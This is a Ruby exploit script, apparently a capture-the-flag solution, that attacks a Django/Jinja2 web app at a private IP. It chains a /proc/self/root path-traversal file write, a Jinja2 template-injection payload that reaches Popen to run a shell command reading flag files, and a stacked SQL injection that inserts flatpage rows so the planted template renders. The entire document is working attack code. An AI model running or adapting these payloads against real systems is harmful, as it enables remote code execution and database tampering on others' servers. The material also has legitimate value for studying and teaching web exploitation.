require 'http'

puts HTTP.basic_auth(:user => "guest", :pass => "guest").headers(:Token => "asdf").post("http://10.25.1.156:8000/api/webframeworks/add", :json => {:filename => "#{"/proc/self/root"*21}/home/web/.local/lib/python3.11/site-packages/pipeline/jinja2/temp.html", :content => "AHA!  {%- for cls in ''.__class__.mro()[1].__subclasses__() -%} {%- if 'Popen' in cls.__name__ -%} {{ cls('cat /flag_*',shell=True,stdout=-1).communicate()[0].strip().decode() }} {%- endif -%} {%- endfor -%}"})

sql = "true'; WITH flatpage AS (INSERT INTO django_flatpage (url, title, content, enable_comments, template_name, registration_required) VALUES (convert_from(decode('2F3078343034', 'hex'), 'UTF8'), 'a', 'a', false, 'temp.html', false) RETURNING id), site AS (INSERT INTO django_site (domain, name) VALUES ('10.25.1.156:8000', 'web.akasec.club') ON CONFLICT (domain) DO UPDATE SET domain = django_site.domain RETURNING id) INSERT INTO django_flatpage_sites (flatpage_id, site_id) SELECT flatpage.id, site.id FROM flatpage, site;-- "

HTTP.basic_auth(:user => "guest", :pass => "guest").headers(:Token => "asdf").get("http://10.25.1.156:8000/api/experiences/setHot/12/#{sql}")
puts HTTP.get("http://10.25.1.156:8000#{%w{2F3078343034}.pack('H*')}")